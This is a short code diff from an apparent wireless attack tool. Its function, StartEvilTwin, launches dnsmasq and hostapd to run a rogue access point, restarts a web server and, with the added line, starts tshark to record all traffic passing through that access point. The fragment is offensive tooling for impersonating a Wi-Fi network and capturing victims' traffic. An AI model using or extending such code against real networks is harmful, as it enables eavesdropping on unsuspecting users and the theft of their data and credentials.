@@ -123,6 +123,7 @@ def StartEvilTwin():
         
         os.system("xterm -bg black -fg white -hold -e 'dnsmasq -C /opt/wci/cache/dnsmasq.conf -d'>/dev/null 2>&1 &")
         os.system("xterm -bg black -fg white -hold -e 'hostapd /opt/wci/cache/hostapd.conf'>/dev/null 2>&1 &")
+        os.system(f"xterm -bg black -fg white -hold -e 'tshark -i {APinterface} -w /opt/wci/main/captures/capture.cap'>/dev/null 2>&1 &")
 
         os.system(f"ifconfig {APinterface} 192.168.1.1/24")
         os.system("systemctl restart httpd")
